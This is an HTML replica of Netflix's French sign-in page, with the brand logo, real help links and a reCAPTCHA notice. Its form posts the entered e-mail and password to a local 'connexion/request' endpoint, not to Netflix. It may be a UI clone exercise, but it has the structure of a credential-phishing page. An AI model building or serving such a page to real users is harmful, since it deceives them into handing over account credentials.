<!-- BACKGROUND -->
    <div class="background-transparent">
        <div class="background-image">
            <!-- HEADER BACKGROUND -->
            <header>
                <div class="logo-container">
                    <svg class="logo" viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo" aria-hidden="true"
                        focusable="false">
                        <g id="netflix-logo">
                            <path
                                d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z"
                                id="Fill-14">
                            </path>
                        </g>
                    </svg>
                </div>
            </header>
            <!-- FORM CONTAINER -->
            <div class="d-center">
                <form class="form-container" action="connexion/request" method="post">
                    <h1 class="form-title">S'identifier</h1>
                    <div class="connexion-error-container">
                        <p>Nous n'avons pas trouvé de compte avec cette adresse e-mail. Veuillez réessayer ou</p>
                        <a href="">créez un nouveau compte.</a>
                    </div>
                    <div class="form-input-container d-center">
                        <div class="input-container">
                            <div class="input-container-content">
                                <input type="text" id="login" class="input-box" name="username">
                                <label for="login" form="login" class="label-box" data-type="login">E-mail ou numéro de
                                    téléphone</label>
                            </div>
                            <p class="input-error" data-type="login">Veuillez entrer une adresse e-mail ou un numéro de téléphone valide.</p>
                        </div>
                        <div class="input-container">
                            <div class="input-container-content">
                                <input type="password" id="mdp" class="input-box" name="password">
                                <label for="mdp" class="label-box" data-type="mdp">Mot de passe</label>
                            </div>
                            <p class="input-error" data-type="mdp">Votre mot de passe doit comporter entre 4 et 60 caractères.</p>
                        </div>
                    </div>
                    <!-- FORM FOOTER CONTAINER -->
                    <div class="form-footer-container d-center">
                        <input type="submit" class="btn-submit" value="S'identifier">
                        <div class="form-option-container d-center">
                            <div class="option-content d-center">
                                <input type="checkbox" id="memory">
                                <label for="memory">Se souvenir de moi</label>
                            </div>
                            <p><a href="https://www.netflix.com/fr/LoginHelp" class="need-help">Besoin d'aide ?</a></p>
                        </div>
                        <!-- FORM FOOTER CONTENT -->
                        <div class="form-footer-content d-center">
                            <div class="first-time-connexion">
                                Première visite sur Netflix ?
                                <a href="https://www.netflix.com/fr/">Inscrivez-vous</a>.
                            </div>
                            <div class="form-footer-security-content">
                                <p>
                                    Cette page est protégée par Google reCAPTCHA pour nous assurer que
                                    vous n'êtes pas un robot.
                                </p>
                                <button class="more-information">En savoir plus.</button>
                            </div>
                            <div class="form-footer-security-information">
                                Les informations collectées par Google reCAPTCHA sont soumises 
                                aux <a href="">Règles de confidentialité</a> et <a href="">Conditions d'utilisation</a> de Google, 
                                et sont utilisées pour fournir, maintenir et améliorer le service reCAPTCHA, 
                                ainsi qu'à des fins de sécurité générale (elles ne sont pas utilisées pour les 
                                publicités personnalisées par Google).
                            </div>
                        </div>
                    </div>
                </form>
            </div>

            <footer>
                <div class="footer-container">
                    <div>Des questions ? Appelez le <a href="tel:(+33) 0805-543-063" class="call-number">(+33) 0805-543-063</a></div>
                    <div class="footer-content d-center">
                        <div class="footer-box d-center">
                            <a href="https://help.netflix.com/fr/node/412">FAQ</a>
                            <a href="https://www.netflix.com/fr/login#">Préférences de cookies</a>
                        </div>
                        <div class="footer-box d-center">
                            <a href="https://help.netflix.com/fr/">Centre d'aide</a>
                            <a href="https://help.netflix.com/legal/corpinfo">Mentions légales</a>
                        </div>
                        <div class="footer-box d-center">
                            <a href="https://help.netflix.com/legal/termsofuse">Condition d'utilisation</a>
                        </div>
                        <div class="footer-box d-center">
                            <a href="https://help.netflix.com/legal/privacy">Confidentialité</a>
                        </div>
                    </div>
                </div>
            </footer>
        </div>
    </div>
</body>
</html>

<script type="text/javascript" src="core/app.js"></script>